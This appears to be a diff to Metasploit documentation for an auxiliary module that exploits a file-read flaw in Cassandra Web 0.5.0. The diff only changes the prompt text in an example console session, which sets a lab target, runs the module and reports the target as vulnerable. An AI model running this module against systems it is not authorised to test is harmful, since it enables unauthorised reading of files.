@@ -55,10 +55,10 @@ cassandra-web
 ## Scenarios
 ### Cassandra Web 0.5.0 Linux Debian 10.11 (Ruby 2.5.5p157 and Apache Cassandra 3.11.13)
 ```
-msf6 > use auxiliary/scanner/http/cassandra_web_file_read
-msf6 auxiliary(scanner/http/cassandra_web_file_read) > set RHOSTS 192.168.56.1
+msf > use auxiliary/scanner/http/cassandra_web_file_read
+msf auxiliary(scanner/http/cassandra_web_file_read) > set RHOSTS 192.168.56.1
 RHOSTS => 192.168.56.1
-msf6 auxiliary(scanner/http/cassandra_web_file_read) > run
+msf auxiliary(scanner/http/cassandra_web_file_read) > run
 
 [*] Running automatic check ("set AutoCheck false" to disable)
 [+] The target appears to be vulnerable. Cassandra Web Detected
